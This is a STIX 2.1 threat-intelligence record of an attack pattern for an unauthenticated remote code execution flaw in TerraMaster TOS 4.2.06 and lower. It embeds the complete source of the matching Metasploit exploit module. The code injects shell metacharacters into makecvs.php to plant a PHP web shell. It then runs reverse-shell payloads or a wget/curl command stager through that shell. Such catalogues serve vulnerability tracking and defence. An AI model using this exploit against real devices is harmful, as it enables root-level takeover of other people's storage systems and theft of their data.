{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5f62fefc-9f4b-49a6-8b8b-fe4d93199714",
    "created": "2024-08-14T17:04:31.276194Z",
    "modified": "2024-08-14T17:04:31.276198Z",
    "name": "TerraMaster TOS 4.2.06 or lower - Unauthenticated Remote Code Execution",
    "description": " This module exploits an unauthenticated remote code-execution vulnerability in TerraMaster TOS 4.2.06 and lower via shell metacharacters in the Event parameter at vulnerable endpoint `include/makecvs.php` during CSV creation. Any unauthenticated user can therefore execute commands on the system under the same privileges as the web application, which typically runs under root at the TerraMaster Operating System.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/terramaster_unauth_rce_cve_2020_35665.rb",
            "external_id": "terramaster_unauth_rce_cve_2020_35665.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-35665"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-28188"
        },
        {
            "source_name": "reference",
            "url": "https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/lXY4yjOvwx/cve-2020-35665"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'TerraMaster TOS 4.2.06 or lower - Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits an unauthenticated remote code-execution vulnerability in TerraMaster TOS 4.2.06\n          and lower via shell metacharacters in the Event parameter at vulnerable endpoint `include/makecvs.php`\n          during CSV creation.\n          Any unauthenticated user can therefore execute commands on the system under the same privileges as the\n          web application, which typically runs under root at the TerraMaster Operating System.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor\n          'IHTeam' # Discovery\n        ],\n        'References' => [\n          ['CVE', '2020-35665'],\n          ['CVE', '2020-28188'],\n          ['PACKETSTORM', '160685'],\n          ['PACKETSTORM', '160687'],\n          ['URL', 'https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/'],\n          ['URL', 'https://attackerkb.com/topics/lXY4yjOvwx/cve-2020-35665']\n        ],\n        'DisclosureDate' => '2020-12-12',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_PHP, ARCH_X64, ARCH_X86, ARCH_AARCH64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'PHP',\n            {\n              'Platform' => 'php',\n              'Arch' => ARCH_PHP,\n              'Type' => :php,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => ['printf', 'echo', 'bourne', 'wget', 'curl'],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 8181,\n          'SSL' => false\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Path to Terramaster Web console', '/']),\n      OptString.new('WEBSHELL', [false, 'Web shell name with extension .php. Name will be randomly generated if left unset.', nil]),\n      OptEnum.new('COMMAND',\n                  [true, 'Use PHP command function', 'passthru', %w[passthru shell_exec system exec]], conditions: %w[TARGET != 0])\n    ])\n  end\n\n  def upload_webshell\n    # randomize file name if option WEBSHELL is not set\n    @webshell_name = (datastore['WEBSHELL'].blank? ? \"#{Rex::Text.rand_text_alpha(8..16)}.php\" : datastore['WEBSHELL'].to_s)\n\n    @post_param = Rex::Text.rand_text_alphanumeric(1..8)\n    @get_param = Rex::Text.rand_text_alphanumeric(1..8)\n\n    # Upload PHP payload\n    webshell = if target['Type'] == :php\n                 \"http|echo \\\"<?php @eval(base64_decode(\\\\$_POST[\\'#{@post_param}\\']));?>\\\" > #{@webshell_name}||\"\n               else\n                 \"http|echo \\\"<?=\\\\$_GET[\\'#{@get_param}\\'](base64_decode(\\\\$_POST[\\'#{@post_param}\\']));?>\\\" > #{@webshell_name}||\"\n               end\n\n    return send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'include', 'makecvs.php'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_get' => {\n        'Event' => webshell.to_s\n      }\n    })\n  end\n\n  def get_terramaster_info\n    # get Terramaster CPU architecture (X64 or ARM64) and TOS version\n    @terramaster = {}\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'tos', 'index.php?user/login')\n    })\n\n    if res && res.body && res.code == 200\n      # get the version information from the request response like below:\n      # <link href=\"./static/style/bootstrap.css?ver=TOS3_A1.0_4.2.07\" rel=\"stylesheet\"/>\n      return if res.body.match(/ver=.+?\"/).nil?\n\n      version = res.body.match(/ver=.+?\"/)[0]\n      # check if architecture is ARM64 or X64\n      if version.match(/_A/)\n        @terramaster['cpu_arch'] = 'ARM64'\n      elsif version.match(/_S/) || version.match(/_Q/)\n        @terramaster['cpu_arch'] = 'X64'\n      else\n        @terramaster['cpu_arch'] = 'UNKNOWN'\n      end\n\n      # strip TOS version number and remove trailing double quote.\n      @terramaster['tos_version'] = version.split('.0_')[1].chop\n    end\n  end\n\n  def execute_php(cmd, _opts = {})\n    payload = Base64.strict_encode64(cmd)\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'include', @webshell_name),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_post' => {\n        @post_param => payload\n      }\n    })\n  end\n\n  def execute_command(cmd, _opts = {})\n    payload = Base64.strict_encode64(cmd)\n    php_cmd_function = datastore['COMMAND']\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'include', @webshell_name),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_get' => {\n        @get_param => php_cmd_function\n      },\n      'vars_post' => {\n        @post_param => payload\n      }\n    })\n  end\n\n  def check\n    get_terramaster_info\n    return CheckCode::Safe if @terramaster.empty?\n\n    if Rex::Version.new(@terramaster['tos_version']) <= Rex::Version.new('4.2.06')\n      return CheckCode::Vulnerable(\"TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.\")\n    else\n      return CheckCode::Safe(\"TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.\")\n    end\n  end\n\n  def exploit\n    res = upload_webshell\n    fail_with(Failure::UnexpectedReply, 'Web shell upload error.') if res.nil? || (res.code != 200)\n    register_file_for_cleanup(@webshell_name.to_s)\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :php\n      execute_php(payload.encoded)\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      # Don't check the response here since the server won't respond\n      # if the payload is successfully executed.\n      execute_cmdstager(linemax: 65536)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-12-12",
    "x_mitre_platforms": [
        "linux'"
    ]
}